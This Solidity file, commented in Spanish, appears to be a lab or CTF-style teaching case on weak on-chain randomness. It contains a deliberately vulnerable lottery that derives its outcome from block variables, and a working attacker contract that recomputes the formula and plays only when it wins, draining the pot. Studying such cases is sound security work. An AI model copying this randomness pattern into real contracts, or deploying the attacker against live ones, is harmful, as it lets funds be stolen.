// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

// Caso C5 - Aleatoriedad débil (OWASP SC09 en 2025, SWC-120).
// La lotería deriva el "azar" de variables del bloque, que el atacante conoce
// en el mismo bloque y puede replicar antes de decidir si juega.

/// @notice Lotería vulnerable. El resultado es calculable por cualquiera en el
/// mismo bloque, así que un atacante solo juega cuando la fórmula dice que gana.
contract LoteriaVulnerable {
    constructor() payable {}

    function jugar() external payable {
        require(msg.value == 1 ether, "1 ETH");

        // FALLO: azar predecible a partir de variables del bloque.
        uint256 aleatorio = uint256(
            keccak256(abi.encodePacked(block.timestamp, block.prevrandao, msg.sender))
        );

        if (aleatorio % 2 == 0) {
            payable(msg.sender).transfer(address(this).balance); // premio
        }
    }

    function isSolved() external view returns (bool) {
        return address(this).balance == 0;
    }
}

/// @notice Atacante: replica la fórmula y solo juega si va a ganar.
contract AtacanteLoteria {
    LoteriaVulnerable public loteria;

    constructor(address _l) payable {
        loteria = LoteriaVulnerable(_l);
    }

    function vaAGanar() public view returns (bool) {
        uint256 aleatorio = uint256(
            keccak256(abi.encodePacked(block.timestamp, block.prevrandao, address(this)))
        );
        return aleatorio % 2 == 0;
    }

    function atacar() external {
        require(vaAGanar(), "esta ronda no toca"); // nunca pierde
        loteria.jugar{value: 1 ether}();
    }

    receive() external payable {}
}
